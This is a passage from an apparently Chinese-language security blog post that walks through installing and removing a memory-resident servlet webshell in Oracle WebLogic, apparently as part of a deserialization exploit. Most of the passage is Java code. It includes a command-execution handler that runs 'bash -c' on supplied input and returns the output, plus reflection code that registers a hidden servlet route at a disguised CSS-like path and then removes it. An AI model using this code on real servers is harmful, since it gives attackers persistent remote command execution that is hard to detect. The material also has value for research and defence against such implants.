</span></span><span style=display:flex><span>            String<span style=color:#f92672>[]</span> cmdarray<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;bash&#34;</span><span style=color:#f92672>,</span><span style=color:#e6db74>&#34;-c&#34;</span><span style=color:#f92672>,</span>ncmd<span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>            ServletOutputStreamImpl sos <span style=color:#f92672>=</span> resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>writeStream</span><span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmdarray<span style=color:#f92672>).</span><span style=color:#a6e22e>getInputStream</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>flush</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getWriter</span><span style=color:#f92672>().</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\n===========\n&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=memsijava安装内存马>memsi.java：安装内存马<a hidden class=anchor aria-hidden=true href=#memsijava安装内存马>#</a></h2><h3 id=探索过程-3>探索过程<a hidden class=anchor aria-hidden=true href=#探索过程-3>#</a></h3><p>这里尝试使用servlet内存马，本质上是先获取到servlet mapping，自定义一个扩展了 <code>javax.servlet.http.HttpServlet</code> 的类，然后往mapping中添加自己定义的路由和处理这个路由的对象。这整个过程都要通过反序列化的操作来实现。</p><h4 id=获取servlet-mapping>获取servlet mapping<a hidden class=anchor aria-hidden=true href=#获取servlet-mapping>#</a></h4><p>首先在合适的地方（比如 <code>com.tangosol.internal.util.invoke.RemotableSupport#realize</code>）下断点，尝试获取servlet mapping</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-12>12</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Field</span> field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 获取servletContext
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>WebAppServletContext servletContext <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 获取servletMapping
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>Method getServletMapping <span style=color:#f92672>=</span> servletContext<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getServletMapping&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>ServletMapping mappings <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ServletMapping<span style=color:#f92672>)</span> getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>servletContext<span style=color:#f92672>);</span>
</span></span></code></pre></td></tr></table></div></div><p>成功获取到</p><p><img loading=lazy src=image-20220701173057613.png alt=image-20220701173057613></p><h4 id=注册servlet>注册servlet<a hidden class=anchor aria-hidden=true href=#注册servlet>#</a></h4><p>为了方便，使用JVM中已加载了的 <code>oracle.security.am.pbl.transport.http.AMServlet</code> 暂时替代自定义的servlet，尝试注册servlet。成功完成。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-31>31</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>String URI <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/pages/css/bluecameby&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>Field field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 获取servletContext
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>WebAppServletContext servletContext <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 获取servletMapping
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>Method getServletMapping <span style=color:#f92672>=</span> servletContext<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getServletMapping&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>ServletMapping mappings <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ServletMapping<span style=color:#f92672>)</span> getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>servletContext<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 使用ServletStub包装HttpServlet
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>Constructor<span style=color:#f92672>&lt;?&gt;</span> ServletStubImplConstructor <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;weblogic.servlet.internal.ServletStubImpl&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>getDeclaredConstructor</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Servlet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> WebAppServletContext<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>ServletStubImplConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HttpServlet httpServlet<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>pbl</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transport</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>.</span><span style=color:#a6e22e>AMServlet</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>ServletStubImpl servletStub <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ServletStubImpl<span style=color:#f92672>)</span> ServletStubImplConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>,</span> httpServlet<span style=color:#f92672>,</span> servletContext<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 使用URLMathchHelper包装ServletStub
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>Constructor<span style=color:#f92672>&lt;?&gt;</span> URLMatchHelperConstructor <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;weblogic.servlet.internal.URLMatchHelper&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>getDeclaredConstructor</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> ServletStubImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>URLMatchHelperConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>Object umh <span style=color:#f92672>=</span> URLMatchHelperConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>,</span> servletStub<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 添加到ServletMapping中，即代表注入servlet内存马成功
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>    mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>,</span> umh<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里遇到了问题，使用oracle.security.am.pbl.transport.http.AMServlet 作为新注册是servlet的处理类的话，可以成功安装和卸载，但使用自定义内嵌类重写get方法则始终不行，无法成功反序列化。不解。</p><p><img loading=lazy src=image-20220708152214644.png alt=image-20220708152214644></p><h4 id=删除servlet>删除servlet<a hidden class=anchor aria-hidden=true href=#删除servlet>#</a></h4><p>卸载内存马，成功完成。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-19>19</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>String URI <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/pages/css/bluecameby&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>Field field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
